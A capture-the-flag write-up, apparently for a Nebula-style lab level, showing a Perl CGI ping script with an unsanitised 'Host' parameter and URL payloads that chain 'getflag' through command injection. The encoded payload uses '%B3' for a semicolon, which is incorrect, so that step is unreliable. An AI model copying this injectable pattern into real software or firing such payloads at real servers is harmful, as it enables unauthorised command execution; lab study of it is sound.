The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.

In /home/flag07 directory we can see two interesting files:

index.cgi
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<html><head><title>Ping results</title></head><body><pre>");

  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");  
}

# check if Host set. if not, display normal page, etc
ping(param("Host"));

and thttpd.conf.

We can assume that thttpd.conf is a configuration for a web server deamon. If we scroll through this file we can find two interesting informations:
- user running the deamon is flag07
- port on which server is listening is 7007.

As always, we're trying to execute getflag as a flag user. Host parameter in perl script is not sanitized, so we should be able to inject our code in there. 
We can check ip address using ifconfig in terminal. Then we can visit webpage from local machine by going to http://vmipaddr:7007/index.cgi

Now we will see information about usage of ping command. This is caused by lack of Host parameter. Let's add one via GET method.

index.cgi?Host=localhost

Now we see resultf of a ping command. Let's try chaining additional command.
index.cgi?Host=localhost ; getflag

Unfortunately, it's not working. The reason is we have unescaped characters in our address. We can get read of spaces and only escape semicolon.
index.cgi?Host=localhost%B3getflag

Now under results of ping we can see a string:
You have successfully executed getflag on a target account.
